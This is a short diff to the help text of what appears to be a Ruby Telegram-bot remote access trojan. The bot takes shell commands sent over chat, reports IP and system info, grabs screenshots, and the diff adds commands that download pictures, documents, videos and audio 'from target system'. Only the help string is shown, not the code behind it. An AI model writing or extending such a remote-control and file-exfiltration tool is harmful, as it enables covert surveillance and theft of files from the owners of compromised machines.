@@ -60,7 +60,10 @@ Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
                 help = """Help:
     /info => To Get ip and system info
     /screenShot => Get ScreenShot of system
-    /down_pic [image name + path]  =>  Uploading File (Demo)
+    /down_pic [ name + path]  =>  Download Pictures from target system.
+    /down_doc  [ name + path] =>  Download Document from target system.
+    /down_vid  [ name + path] =>  Download Video from target system.
+    /down_audio [ name + path]=>   Download Audio from target system.
 
 for run shell command just send without `/` and \nRecive result.
 
